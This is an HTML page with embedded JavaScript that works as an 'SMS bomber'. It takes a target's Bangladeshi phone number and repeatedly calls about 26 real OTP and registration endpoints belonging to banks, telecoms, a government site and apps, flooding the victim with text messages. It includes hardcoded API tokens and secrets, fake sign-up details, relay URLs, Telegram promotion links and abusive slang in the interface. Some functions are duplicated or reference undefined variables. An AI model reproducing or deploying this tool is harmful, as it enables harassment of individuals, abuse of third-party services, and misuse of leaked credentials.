
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GUA MAR BOOMBER</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
        :root {
            --primary-color: #ff0000;
            --secondary-color: #ff6600;
            --background-color: #000000;
            --text-color: #ffffff;
        }
        body {
    background-color: var(--background-color);
    color: var(--text-color);
    font-family: 'Orbitron', sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    margin: 0;
    padding: 20px;
    box-sizing: border-box;
    overflow-x: hidden;
}

        .container {
            max-width: 700px;
            width: 95%;
            text-align: center;
            opacity: 0;
            transform: translateY(50px);
            animation: fadeInUp 1s ease-out forwards;
        }
        @keyframes fadeInUp {
            to { opacity: 1; transform: translateY(0); }
        }
        .logo {
            width: 140px;
            height: 140px;
            margin: 0 auto 30px;
            position: relative;
            overflow: hidden;
            border-radius: 50%;
            box-shadow: 0 0 20px var(--primary-color);
            background: url('https://i.ibb.co/54YLjNM/20240912-145954.png') no-repeat center center;
            background-size: cover;
            animation: waveMotion 3s infinite ease-in-out;
        }
        @keyframes waveMotion {
            0% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0); }
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 3px;
            color: var(--primary-color);
            text-shadow: 0 0 10px var(--primary-color), 0 0 20px var(--primary-color);
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px var(--primary-color), 0 0 20px var(--primary-color); }
            to { text-shadow: 0 0 15px var(--primary-color), 0 0 30px var(--primary-color), 0 0 45px var(--secondary-color); }
        }
        .line {
            width: 95%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
        }
        .line::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, var(--text-color), transparent);
            animation: shimmer 2s infinite;
        }
        @keyframes shimmer {
            100% { left: 100%; }
        }
        .input-container {
            position: relative;
            margin-bottom: 30px;
            transition: transform 0.2s ease;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid var(--primary-color);
            background-color: var(--background-color);
            color: var(--text-color);
            font-size: 1em;
            border-radius: 5px;
            transition: all 0.3s ease;
            font-family: 'Orbitron', sans-serif;
        }
        input:focus {
            outline: none;
            box-shadow: 0 0 15px var(--primary-color);
            transition: box-shadow 0.2s ease;
        }
        label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            transition: all 0.3s ease;
            pointer-events: none;
            color: var(--primary-color);
        }
        input:focus + label, input:not(:placeholder-shown) + label {
            top: -10px;
            font-size: 0.8em;
            background-color: transparent;
            padding: 0 5px;
            transition: top 0.2s ease, font-size 0.2s ease;
        }
        button {
            padding: 15px 30px;
            background-color: var(--primary-color);
            color: var(--background-color);
            border: none;
            cursor: pointer;
            font-size: 1.2em;
            border-radius: 5px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            overflow: hidden;
            font-family: 'Orbitron', sans-serif;
        }
        button:hover {
            background-color: var(--secondary-color);
            box-shadow: 0 0 20px var(--secondary-color);
            transform: scale(1.05);
        }
        .spinner {
            display: none;
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }
        .status-item {
            font-size: 1.2em;
        }
        .success {
            color: #2ecc71;
        }
        .failure {
            color: #e74c3c;
        }
        .message {
            display: none;
            background-color: var(--primary-color);
            color: var(--background-color);
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            font-size: 1.1em;
            position: relative;
            animation: fadeIn 1s ease;
        }
        .message.show {
            display: block;
        }
        .message.error {
            background-color: #e74c3c;
        }
        .message.info {
            background-color: #3498db;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .status-animate {
            display: inline-block;
            transition: all 0.5s ease;
            transform-origin: center;
        }
        .animate-success {
            color: #2ecc71;
            animation: bounceSuccess 1s ease;
        }
        .animate-failure {
            color: #e74c3c;
            animation: bounceFailure 1s ease;
        }
        @keyframes bounceSuccess {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        @keyframes bounceFailure {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        footer {
            margin-top: 35px;
            font-size: 0.8em;
            opacity: 0.7;
        }
        a {
            color: var(--primary-color);
            text-decoration: none;
            transition: all 0.3s ease;
        }
        a:hover {
            color: var(--secondary-color);
            text-shadow: 0 0 10px var(--secondary-color);
        }
        @media (max-width: 600px) {
            h1 {
                font-size: 2em;
            }
            .logo {
                width: 150px;
                height: 150px;
            }
            input, button {
                font-size: 0.9em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"></div>
        <h1>GUA MAR MANGER NATIR</h1>
        <div class="line"></div>
        <div class="input-container">
            <input type="number" id="number" placeholder=" " required>
            <label for="number">MANGER CHELER NUMBER DEY</label>
        </div>
        <div class="input-container">
            <input type="number" id="amount" placeholder=" " required>
            <label for="amount">Amount Highest "TOR ICCHA BC" </label>
        </div>
        <button onclick="startProcess()">CUDEY DEY</button>
        <div class="spinner"></div>
        <div class="status" id="status">
            <div class="status-item success">
                <span id="successCount">0</span> SABAS KOTUA
            </div>
            <div class="status-item failure">
                <span id="failureCount">0</span> BAL FATA
            </div>
        </div>
        <div id="message" class="message"></div>
           </div>
    </div>
    <footer>
        TOR BAP BOKACODA <a href="https://t.me/+8801799953059" target="_blank">CUDIR VAI LEWRA</a> | Taratari Join kor "MANGER NATI World" <a href="https://t.me/+MO9vhlyGLiczYzM1" target="_blank">Ei ney link kotua</a>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentNode.style.transform = 'scale(1.05)';
                });
                input.addEventListener('blur', function() {
                    this.parentNode.style.transform = 'scale(1)';
                });
            });
        });

        async function api_1(phone) {
    const data = {
        "countryId": "19",
        "mobileNumber": phone,
        "purpose": "registration"
    };

    try {
        const response = await fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'authorization': 'Otp bnVsbA=='
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 1 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 1 Error:', error);
        throw error;
    }
}

async function api_2(phone) {
    const url = `https://chinaonlineapi.com/api/v1/get/otp?phone=${phone}`;

    try {
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                'token': 'gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219',
                'Origin': 'https://chinaonlinebd.com',
                'Referer': 'https://chinaonlinebd.com/'
            }
        });

        const result = await response.json();

       
        if (result.status === 'Failed' || result.msg.includes('OTP limit exceeded')) {
            throw new Error(`API 2 Failure: ${result.msg || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 2 Error:', error);
        throw error;
    }
}

async function api_3(phone) {
    const url = "https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/108.0',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ "phoneNumber": "+88" + phone })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 3 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 3 Error:', error);
        throw error;
    }
}

async function api_4(phone) {
    const url = "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ number: phone })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 4 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 4 Error:', error);
        throw error;
    }
}

async function api_5(phone) {
    const url = "https://user-api.jslglobal.co:444/v1/send-otp";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)',
            'Origin': 'https://rental.jatri.co',
            'Referer': 'https://rental.jatri.co/'
            },
            body: new URLSearchParams({
            phone: `+88${phone}`,
            jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 5 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 5 Error:', error);
        throw error;
    }
}

async function api_6(phone) {
    const url = "https://gw.jotno.net/auth/login/token";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            },
            body: JSON.stringify({ username: phone })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 6 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 6 Error:', error);
        throw error;
    }
}

async function api_7(phone) {
 const data = {
 mobile: '+88-' + phone,
 deviceToken: 'app',
 language: 'bn',
 os: 'android'
 };
    try {
        const response = await fetch('https://api.osudpotro.com/api/v1/users/send_otp', {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 7 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 7 Error:', error);
        throw error;
    }
}

async function api_8(phone) {
 const data = {
 full_name: "Hangama",
 company_name: "Hangama",
 email_address: "hangama@gmail.com",
 phone_number: phone
 };
    try {
        const response = await fetch('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 8 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 8 Error:', error);
        throw error;
    }
}

async function api_9(phone) {
    const url = "https://developer.quizgiri.xyz/api/v2.0/send-otp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
            },
            body: JSON.stringify({
            country_code: "+880",
            phone: phone
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 9 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 9 Error:', error);
        throw error;
    }
}

async function api_10(phone) {
    const url = "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'Content-Length': JSON.stringify({
            country_code: "+88",
            phone: phone
            }).length
            },
            body: JSON.stringify({
            country_code: "+88",
            phone: phone
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 10 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 10 Error:', error);
        throw error;
    }
}

        async function api_11(phone) {
 const data = {
 phone: phone,
 type: 'student',
 auth_type: 'signup',
 vendor: 'shikho'
 };
    try {
        const response = await fetch('https://api.shikho.com/auth/v2/send/sms', {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
           'Accept': 'application/json, text/plain, */*',
           'Origin': 'https://app.shikho.com',
           'Referer': 'https://app.shikho.com/'
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 11 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 11 Error:', error);
        throw error;
    }
}

async function api_12(phone) {
 const data = {
 "Operation": "CreateSubscription",
 "MobileNumber": "88" + phone,
 "PackageID": 100,
 "Secret": "HJKX71%UHYH"
 };
    try {
        const response = await fetch('https://api.toybox.live/bdapps_handler.php', {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 12 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 12 Error:', error);
        throw error;
    }
}

async function api_12(phone) {
 const data = new URLSearchParams({
 phone: '+88' + phone,
 jatri_token: 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'
 });
    try {
        const response = await fetch('https://user-api.jslglobal.co/v1/send-otp', {
            method: 'POST',
           headers: {
           'User-Agent': 'okhttp/3.9',
           'Content-Type': 'application/x-www-form-urlencoded',
           },
           body: data
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 12 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 12 Error:', error);
        throw error;
    }
}

async function api_13(phone) {
 const data = {
 phone: phone,
 language: 1
 };
 
    try {
        const response = await fetch('https://api.betonbook.com/api/v5/auth/otp/request', {
            method: 'POST',
           headers: {
           "Content-Type": "application/json"
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 14 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 13 Error:', error);
        throw error;
    }
}

async function api_14(phone) {
 const data = {
 "msisdn": "88" + phone
 };
 
    try {
        const response = await fetch('https://applink.com.bd/appstore-v4-server/login/otp/request', {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0',
           'Referer': 'https://applink.com.bd/',
           'Origin': 'https://applink.com.bd'
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 14 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 14 Error:', error);
        throw error;
    }
}

async function api_15(phone) {
    const url = "https://webapi.robi.com.bd/v1/send-otp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjE4MSwibmJmIjoxNjkyNjQyMTgxLCJleHAiOjE2OTI2NDU3ODEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.zIjqAeTCI-kFmH5nTuAII1HzQISfOLOyLfYH4FlcjXA',
            'Content-Type': 'application/json'
            },
            body: JSON.stringify({
            phone_number: phone,
            type: 'my_offer'
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 15 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 15 Error:', error);
        throw error;
    }
}

async function api_16(phone) {
    const url = "https://webapi.robi.com.bd/v1/account/register/otp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0'
            },
            body: JSON.stringify({
            phone_number: phone
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 16 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 16 Error:', error);
        throw error;
    }
}

async function api_17(phone) {
    const url = "https://softmaxmanager.xyz/api/v1/user/request/otp/";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
            'user-agent': 'Dart/3.4 (dart:io)',
            'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
            'accept-encoding': 'gzip',
            'authorization': 'Basic c29zOjI3TTMjYTRz',
            'host': 'softmaxmanager.xyz'
            },
            body: new URLSearchParams({
            'phone_number': '+88' + phone_number,
            'app_signature': 'Fu89B%2BdY9dz'
            })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 17 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 17 Error:', error);
        throw error;
    }
}

async function api_18(phone) {
    const url = "https://training.gov.bd/backoffice/api/user/sendOtp";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
           headers: {
           'Host': 'training.gov.bd',
           'Connection': 'keep-alive',
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
           'Origin': 'https://training.gov.bd',
           'Referer': 'https://training.gov.bd/signup',
           'Accept-Encoding': 'gzip, deflate, br',
           'Accept-Language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7'
           },
           body: JSON.stringify({
           mobile: mobile
           })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 18 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 18 Error:', error);
        throw error;
    }
}
async function api_19(phone) {
    const url = "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'Referer': 'https://doctime.com.bd/',
           'Origin': 'https://doctime.com.bd',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
           },
           body: JSON.stringify({
           data: {
           flag: 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
           code: '88',
           contact_no: phoneNumber,
           country_calling_code: '88',
           headers: {
           PlatForm: 'Web'
           }
           }
           })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 19 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 19 Error:', error);
        throw error;
    }
}
async function api_20(phone) {
    const url = "https://core.easy.com.bd/api/v1/registration";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
           'Referer': 'https://easy.com.bd/'
           },
           body: JSON.stringify({
           "name": "Shahidul Islam",
           "email": "uyrlhkgxqw@emergentvillage.org",
           "mobile": phone,
           "password": "boss#2022",
           "password_confirmation": "boss#2022",
           "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"
           })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 20 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 20 Error:', error);
        throw error;
    }
}
async function api_21(phone) {
const data = {
    type: "phone",
    phone: phone
           };

 
    try {
        const response = await fetch('https://eshop-api.banglalink.net/api/v1/customer/send-otp', {
            method: 'POST',
           headers: {
           "Content-Type": "application/json",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 21 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 21 Error:', error);
        throw error;
    }
}

async function api_22(phone) {
    const data = {
        type: "phone",
        phone: phone
    };

    try {
       
        const response = await fetch(`https://hadivai-mahirvai.my.id/fuckboom.php?phone=${phone}`, {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                'Content-Type': 'application/json',
                'Content-Length': '0'
            }
        });

        const result = await response.json();

       
        if (result.status === 'failed') {
            throw new Error(`API 22 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 22 Error:', error);
        throw error;
    }
}

async function api_23(phone) {
    const url = `https://hadivai-mahirvai.my.id/kupasamsu.php?phone=${phone}`;

    try {
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
            }
        });

        const result = await response.json();

        if (result.status === 'Failed' || result.msg.includes('OTP limit exceeded')) {
            throw new Error(`API 23 Failure: ${result.msg || 'Unknown error'}`);
        }
 return result;
    } catch (error) {
        console.error('API 23 Error:', error);
        throw error;
    }
}

async function api_24(phone) {
    const url = "https://da-api.robi.com.bd/da-nll/otp/send";
    

    try {
        const response = await fetch(url, {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json'
           },
           body: JSON.stringify({
           msisdn: phone
           })
        });

        const result = await response.json();

        
        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 24 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 24 Error:', error);
        throw error;
    }
}

async function api_25(phone) {
    const url = "https://api.chardike.com/api/otp/send"; // নতুন URL

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                phone: phone, 
                otp_type: "login" 
            })
        });

        const result = await response.json();

        if (result.status === 'Failed' || result.error || result.message.includes('limit exceeded')) {
            throw new Error(`API 25 Failure: ${result.message || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 25 Error:', error);
        throw error;
    }
}


async function api_26(phone) {
const data = {
   "phoneNumber": phone
         };

 
    try {
        const response = await fetch('https://api.apex4u.com/api/auth/login', {
            method: 'POST',
           headers: {
           'Content-Type': 'application/json',
           'User-Agent': 'Mozilla/5.0'
           },
           body: JSON.stringify(data)
        });

        const result = await response.json();

      
        if (result.otpsent === 'false' || result.status === 'failed') {
            throw new Error(`API 26 Failure: ${result.error || 'Unknown error'}`);
        }

        return result;
    } catch (error) {
        console.error('API 26 Error:', error);
        throw error;
    }
}


        const apis = [
            { func: api_1, limit: 100, count: 0 },
            { func: api_2, limit: 100, count: 0 },
            { func: api_3, limit: 100, count: 0 },
            { func: api_4, limit: 100, count: 0 },
            { func: api_5, limit: 100, count: 0 },
            { func: api_6, limit: 100, count: 0 },
            { func: api_8, limit: 100, count: 0 },
            { func: api_9, limit: 100, count: 0 },
            { func: api_10, limit: 100, count: 0 },
            { func: api_11, limit: 100, count: 0 },
            { func: api_12, limit: 100, count: 0 },
            { func: api_13, limit: 50, count: 0 },
            { func: api_14, limit: 50, count: 0 },
            { func: api_15, limit: 50, count: 0 },
            { func: api_16, limit: 50, count: 0 },
            { func: api_17, limit: 100, count: 0 },
            { func: api_18, limit: 100, count: 0 },
            { func: api_19, limit: 100, count: 0 },
            { func: api_20, limit: 100, count: 0 },
            { func: api_21, limit: 100, count: 0 },
            { func: api_22, limit: 100, count: 0 },
            { func: api_23, limit: 100, count: 0 },
            { func: api_24, limit: 100, count: 0 },
            { func: api_25, limit: 100, count: 0 },
            { func: api_26, limit: 100, count: 0 },
         
        ];

        function canCallApis(count) {
            const totalLimit = apis.reduce((acc, api) => acc + api.limit, 0);
            return totalLimit >= count;
        }

        function validateNumber(number) {
            const phoneRegex = /^01\d{9}$/;
            return phoneRegex.test(number);
        }

        function validateAmount(amount) {
            return amount > 0 && amount <= 6;
        }

        function showMessage(type, text) {
            const messageDiv = document.getElementById('message');
            messageDiv.className = `message ${type}`;
            messageDiv.textContent = text;
            messageDiv.classList.add('show');
            setTimeout(() => messageDiv.classList.remove('show'), 3000);
        }
async function startProcess() {
    const button = document.querySelector('button');
    const spinner = document.querySelector('.spinner');
    const inputs = document.querySelectorAll('input');
    const number = document.getElementById('number').value;
    const amount = parseInt(document.getElementById('amount').value);
	const totalLimit = apis.reduce((acc, api) => acc + api.limit, 0);

    if (Array.from(inputs).every(input => input.value.trim() !== '')) {
        if (!validateNumber(number)) {
            showMessage('error', 'Type Real Number ');
            return;
        }

        if (canCallApis(amount)) {
            button.style.display = 'none';
            spinner.style.display = 'inline-block';

            let successCount = 0;
            let failureCount = 0;

            // প্রতিটি রিকোয়েস্টকে unique ভাবে পাঠানো হচ্ছে
            for (let i = 0; i < amount; i++) {
                const availableApis = apis.filter(api => api.count < api.limit);
                if (availableApis.length === 0) {
                    break;
                }

                const apiIndex = i % availableApis.length;
                const currentApi = availableApis[apiIndex];

                try {
                    // রিকোয়েস্ট পাঠানোর আগেই লিমিট চেক করা
                    if (currentApi.count >= currentApi.limit) {
                        throw new Error('API limit exceeded');
                    }

                    const response = await currentApi.func(number);

                    // ব্যর্থতা চেক
                    if (!response || 
                        response.status === 'Failed' || 
                        response.status === 'failed' || 
                        response.otpsent === 'false' || 
                        response.otpsent === 'False' || 
                        response.error || 
                        response.message?.includes('limit exceeded')) {
                        throw new Error(`API Failure: ${response.msg || response.error || 'Unknown error'}`);
                    }

                    currentApi.count += 1;
                    successCount += 1;
                    document.getElementById('successCount').textContent = successCount;
                } catch (error) {
                    failureCount += 1;
                    document.getElementById('failureCount').textContent = failureCount;
                }
            }

            apis.forEach(api => api.count = 0);
            spinner.style.display = 'none';
            button.style.display = 'inline-block';
        } else {
            showMessage('error', 'Type amount(সর্বাধিক '+ totalLimit +')।');
        }
    } else {
        showMessage('error', 'Please type number and amount');
    }
}

    </script>
</body>
</html>
